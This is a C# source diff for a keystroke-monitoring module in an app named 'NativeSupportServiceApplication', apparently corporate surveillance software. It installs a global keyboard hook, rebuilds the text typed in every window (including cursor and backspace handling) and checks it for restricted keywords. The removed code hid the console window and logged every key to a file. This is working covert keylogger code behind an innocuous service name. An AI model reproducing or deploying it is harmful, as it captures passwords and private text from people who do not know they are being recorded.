@@ -1,47 +1,133 @@
-﻿using NativeSupportServiceApplication.Models;
+﻿using Keystroke.API;
+using Keystroke.API.CallbackObjects;
+using NativeSupportServiceApplication.Models;
 using NativeSupportServiceApplication.Utils;
+using System;
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.Reflection.Emit;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
+using Windows.Storage.Streams;
 
 namespace NativeSupportServiceApplication.Modules
 {
 
     class KeyStrokeCache
     {
-        
+
 
         public static ConcurrentDictionary<String, KeyStrokeBuffer> cache = new ConcurrentDictionary<string, KeyStrokeBuffer>();
         public static void appendCharacter(char c, String windowTitle)
         {
+
+           
+           
             windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
 
-            if (cache.ContainsKey(windowTitle))
+            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle);
+
+            if (keyBuffer.isSelectAll)
             {
-                cache.GetValueOrDefault(windowTitle).appendCharacter(c);
+                keyBuffer.clear();
+            }
+
+            keyBuffer.appendCharacter(c);
+
+        }
+
+        public static void deleteChar(String windowTitle, String action)
+        {
+
+           
+            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
+            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle) ;
+            if (keyBuffer.isSelectAll)
+            {             
+                keyBuffer.clear();
             }
             else
             {
-                cache.TryAdd(windowTitle, new KeyStrokeBuffer().appendCharacter(c));
-
+                keyBuffer.deleteLastChar(action);
             }
 
         }
 
-        public static void deleteChar(String windowTitle)
+        public static void updateCursor(String windowTitle, String action)
         {
-            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
 
+
+
+            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
+            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle);
+
+
+            if (action.Equals("<left>"))
+            {
+
+                keyBuffer.leftVal++;
+                if (keyBuffer.stringValue().Length < keyBuffer.leftVal)
+                {
+                    keyBuffer.leftVal = keyBuffer.stringValue().Length;
+                }
+
+            }
+            else if (action.Equals("<right>"))
+            {
+                keyBuffer.leftVal--;
+
+                if (keyBuffer.leftVal < 0)
+                {
+                    keyBuffer.leftVal = 0;
+                }
+            }
+            else if (action.Equals("<home>"))
+            {
+
+                keyBuffer.leftVal = keyBuffer.stringValue().Length;
+
+
+
+            }
+            else if (action.Equals("<end>"))
+            {
+
+                keyBuffer.leftVal = 0;
+            }
+
+            Debug.WriteLine("lval" + keyBuffer.leftVal);
+
+        }
+
+        private static KeyStrokeBuffer getKeyBuffer(String windowTitle)
+        {
+            KeyStrokeBuffer keyBuffer;
             if (cache.ContainsKey(windowTitle))
             {
-                cache.GetValueOrDefault(windowTitle).deleteLastChar();
+                keyBuffer = cache.GetValueOrDefault(windowTitle);
+
+
+
             }
             else
             {
-                cache.TryAdd(windowTitle, new KeyStrokeBuffer().deleteLastChar());
+
+                keyBuffer = new KeyStrokeBuffer();
+
+
+                cache.TryAdd(windowTitle, keyBuffer);
 
             }
+            return keyBuffer;
+        }
+
+
+
+        internal static KeyStrokeBuffer getInstance(String windowTitle)
+        {
+            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
+            return getKeyBuffer(windowTitle);
 
         }
     }
@@ -52,6 +138,16 @@ namespace NativeSupportServiceApplication.Modules
 
         private int MAX_LENGTH = 1024;
 
+        public int leftVal = 0;
+
+        public Boolean isControl = false, isSelectAll = false;
+
+        public void clear()
+        {
+            keyStrokeBuffer.Clear();
+            leftVal = 0;
+        }
+
         public String stringValue()
         {
             return keyStrokeBuffer.ToString();
@@ -59,7 +155,8 @@ namespace NativeSupportServiceApplication.Modules
         public KeyStrokeBuffer appendCharacter(char c)
         {
 
-            keyStrokeBuffer.Append(c);
+
+            keyStrokeBuffer.Insert(keyStrokeBuffer.Length - leftVal, c);
 
             if (keyStrokeBuffer.Length > MAX_LENGTH)
             {
@@ -68,11 +165,42 @@ namespace NativeSupportServiceApplication.Modules
             }
             return this;
         }
-        public KeyStrokeBuffer deleteLastChar()
+        public KeyStrokeBuffer deleteLastChar(String action)
         {
+
+            Debug.WriteLine("lval" + leftVal);
             if (keyStrokeBuffer.Length > 0)
             {
-                keyStrokeBuffer.Remove(keyStrokeBuffer.Length - 1, 1);
+                if (action.Equals("<backspace>"))
+                {
+
+                    if (keyStrokeBuffer.Length != 0)
+                    {
+
+                        keyStrokeBuffer.Remove(keyStrokeBuffer.Length - 1 - leftVal, 1);
+                        // leftVal--;
+                    }
+                    else
+                    {
+                        leftVal = 0;
+                    }
+
+                }
+                else
+                {
+
+                    if (keyStrokeBuffer.Length != 0 && leftVal != 0)
+                    {
+
+                        keyStrokeBuffer.Remove(keyStrokeBuffer.Length - leftVal, 1);
+                        leftVal--;
+                    }
+                    else
+                    {
+                        // leftVal = 0;
+                    }
+
+                }
             }
             Debug.WriteLine("Now line " + keyStrokeBuffer.ToString());
             return this;
@@ -81,154 +209,125 @@ namespace NativeSupportServiceApplication.Modules
     class InterceptKeys
     {
 
-        
-        private static string GetActiveWindowTitle()
-        {
-            const int nChars = 256;
-            StringBuilder Buff = new StringBuilder(nChars);
-            IntPtr handle = GetForegroundWindow();
 
-            if (GetWindowText(handle, Buff, nChars) > 0)
-            {
-                return Buff.ToString();
-            }
-            return null;
-        }
 
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
-        public static char pk1 = '1', pk2 = '2', pk3 = '3', pk4 = '4';
+
+        public static int leftCount = 0;
         public static void startMonitor()
         {
-            var handle = GetConsoleWindow();
-
-            // Hide
-            ShowWindow(handle, SW_HIDE);
-
-            _hookID = SetHook(_proc);
-            Application.Run();
-            UnhookWindowsHookEx(_hookID);
-
-        }
-
-
-        private static IntPtr SetHook(LowLevelKeyboardProc proc)
-        {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
+            using (var api = new KeystrokeAPI())
             {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
+                api.CreateKeyboardHook((character) => { callback(character); });
+                Application.Run();
             }
+
         }
 
-        private delegate IntPtr LowLevelKeyboardProc(
-            int nCode, IntPtr wParam, IntPtr lParam);
 
-        private static IntPtr HookCallback(
-            int nCode, IntPtr wParam, IntPtr lParam)
+        private static void callback(KeyPressed keyPressed)
         {
 
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+
+
+            try
             {
 
-                int vkCode = Marshal.ReadInt32(lParam);
+                String windowTitle = keyPressed.CurrentWindow;
 
-                String windowTitle = GetActiveWindowTitle();
-
-                pk4 = pk3;
-                pk3 = pk2;
-                pk2 = pk1;
-                pk1 = (char)vkCode;
-
-                if (pk1 == (char)8 || pk1 == (char)127)
-                { 
-                }
-
-                    Debug.WriteLine(vkCode);
-
-                if (vkCode > 31 && vkCode < 127)
+                if (KeyStrokeCache.getInstance(windowTitle).isControl)
                 {
-                    KeyStrokeCache.appendCharacter((char)vkCode, windowTitle);
+                    if (keyPressed.ToString().Equals("a"))
+                    {
+                        KeyStrokeCache.getInstance(windowTitle).isSelectAll = true;
+                        KeyStrokeCache.getInstance(windowTitle).isControl = false;
+                    }
+                }
+                else
+                {
+
+                    if (keyPressed.ToString().Length == 1)
+                    {
+                        char vkCode = Char.Parse(keyPressed.ToString());
+
+
+
+                        if (vkCode > 31 && vkCode < 127)
+                        {
+
+
+
+                            KeyStrokeCache.appendCharacter(vkCode, windowTitle);
+
+                            //Debug.WriteLine(vkCode);
+
+                           
+
+
+                        }
+
+                    }
+
+                    else if (keyPressed.ToString().Equals("<backspace>") || keyPressed.ToString().Equals("<delete>"))
+                    {
+                        // 
+                        KeyStrokeCache.deleteChar(windowTitle, keyPressed.ToString());
+                    }
+                    else if (keyPressed.KeyCode.ToString().EndsWith("ControlKey"))
+                    {
+                        KeyStrokeCache.getInstance(windowTitle).isControl = true;
+                    }
+                    else
+                    {
+                        KeyStrokeCache.updateCursor(windowTitle, keyPressed.ToString());
+                    }
 
                     processKeypress(windowTitle);
 
-
-                }
-                else if (vkCode == 8)
-                {
-                    KeyStrokeCache.deleteChar(windowTitle);
+                    KeyStrokeCache.getInstance(windowTitle).isSelectAll = false;
                 }
 
-                //if (vkCode == 67)
-                //{
-                //    Application.Exit();
-                //}
-                //  Debug.WriteLine(life is beautiful life is beautiful yStrokeCache.cache);
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode + "\n");
-                sw.Close();
             }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            catch
+            {
+            }
+
+            //if (vkCode == 67)
+            //{
+            //    Application.Exit();
+            //}
+            //  Debug.WriteLine(life is beautiful life is beautiful yStrokeCache.cache);
+            //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+            //sw.Write((Keys)vkCode + "\n");
+            //sw.Close();
+
+
         }
 
+      
+
+        
         private static void processKeypress(string windowTitle)
         {
             try
             {
                 KeyStrokeCache.cache.TryGetValue(windowTitle, out var buffer);
-                Debug.WriteLine(buffer.stringValue());
-                foreach (RestrictedKeyword rkeyword in Cache.restrictedKeywords)
+                Debug.WriteLine(windowTitle + buffer.stringValue());
+
+                var result = GeneralUtil.checkKeywordMatch(buffer.stringValue().ToLower());
+                if(result != null)
                 {
-                    foreach (String key in rkeyword.RestrictedKeywords)
-                    {
-                        
-                        if (buffer.stringValue().ToLower().Contains(" "+key.ToLower()+" "))
-                        {
 
-                            rkeyword.ViolatedMsg = key;
+                     AlertHandler.handle(result,EventSource.KEYBOARD);
 
-                            AlertHandler.handle(rkeyword);
-                        }
-                    }
                 }
             }
-            catch
+            catch (Exception ex)
             {
+                Debug.WriteLine(ex);
             }
         }
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook,
-            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        const int SW_HIDE = 0;
-
-
-        [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
 
     }
